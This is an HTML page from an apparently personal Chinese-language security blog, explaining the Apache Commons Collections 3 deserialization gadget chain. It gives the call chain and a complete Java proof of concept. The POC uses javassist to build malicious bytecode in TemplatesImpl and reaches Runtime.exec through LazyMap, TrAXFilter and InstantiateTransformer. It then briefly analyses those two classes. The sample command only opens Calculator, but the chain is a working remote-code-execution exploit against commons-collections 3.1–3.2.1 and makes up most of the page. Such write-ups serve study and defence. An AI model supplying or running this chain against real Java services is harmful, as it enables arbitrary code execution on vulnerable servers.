<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache-Commons-Collections 3 - ConsT27's Blog</title>
    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache-Commons-Collections 3", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "\u7248\u672c", url: "#_2" },
              {title: "\u5229\u7528\u94fe", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Apache-Commons-Collections%204/Apache-Commons-Collections%204/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Apache-Commons-Collections%204/Apache-Commons-Collections%204/" class="btn btn-xs btn-link">
        Apache-Commons-Collections 4
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Apache-Commons-Collections%202/Apache-Commons-Collections%202/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Apache-Commons-Collections%202/Apache-Commons-Collections%202/" class="btn btn-xs btn-link">
        Apache-Commons-Collections 2
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-commons-collections-3">Apache-Commons-Collections 3</h1>
<h2 id="_1">目录</h2>
<ul>
<li><a href="#版本">版本</a></li>
<li><a href="#利用链">利用链</a><ul>
<li><a href="#TrAXFilterclass">TrAXFilter.class</a></li>
<li><a href="#InstantiateTransformer-">InstantiateTransformer </a></li>
</ul>
</li>
</ul>
<p>CC3链大致上是CC1和CC2的缝合，中间一些细节有点不同（TrAXFilter，InstantiateTransformer）</p>
<p>LazyMap+TrAXFilter+InstantiateTransformer+TemplatesImpl</p>
<h2 id="_2">版本</h2>
<p>commons-collections-3.1-3.2.1，JDK1.7</p>
<h2 id="_3">利用链</h2>
<pre><code class="language-java">ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InstantiateTransformer.transform()
                            newInstance()
                                TrAXFilter#TrAXFilter()
                                TemplatesImpl.newTransformer()
                                         TemplatesImpl.getTransletInstance()
                                         TemplatesImpl.defineTransletClasses
                                         newInstance()
                                            Runtime.exec()
</code></pre>
<p>POC</p>
<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


public class Main {

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass(&quot;Cat&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open  /System/Applications/Calculator.app\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);
        setFieldValue(templates, &quot;_class&quot;, null);

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);


        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);
        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);


        Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc3&quot;));
            outputStream.writeObject(handler);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc3&quot;));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
</code></pre>
<p>可以发现是ChianedTransformer+TemplatesImpl+LazyMap 缝合，不过ChianedTransformer内部有点和CC链1、2不同.</p>
<pre><code class="language-java">      ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });
</code></pre>
<p>我们可以发现是通过InstantiateTransformer 替代了InvokerTransformer，并且用到了TrAXFilter.class 这个类。</p>
<p>我们来分析一下这两个贵物。</p>
<h3 id="traxfilterclass">TrAXFilter.class</h3>
<p><img alt="" src="../image/image_CNyKJCLCCL.png" /></p>
<p>十分明显，TrAXFilter的构造方法对传入的Templates对象进行了实例化处理，而TemplatesImpl是Templates的子类，于是乎我们可以传入一个TemplatesImpl对象，使该对象的newTransformer方法被调用，以此促成TemplatesImpl对象中_bytecodes中的字节码被实例化成一个恶意对象，并调用这个恶意对象的构造方法。</p>
<h3 id="instantiatetransformer">InstantiateTransformer&#x20;</h3>
<p><img alt="" src="../image/image_3IKixiwHEB.png" /></p>
<p>可以发现transformer方法中会获取传入对象的构造方法，并传入参数调用其构造方法。
我们这个地方传入TrAXFilter对象，并传入恶意的TemplatesImpl对象便可以在TrAXFilter调用构造方法时调用TemplatesImpl.newInstance 把恶意对象从字节码生成出来并调用恶意对象的构造方法。</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Apache-Commons-Collections%204/Apache-Commons-Collections%204/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Apache-Commons-Collections%204/Apache-Commons-Collections%204/" class="btn btn-xs btn-link">
        Apache-Commons-Collections 4
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Apache-Commons-Collections%202/Apache-Commons-Collections%202/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Apache-Commons-Collections%202/Apache-Commons-Collections%202/" class="btn btn-xs btn-link">
        Apache-Commons-Collections 2
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>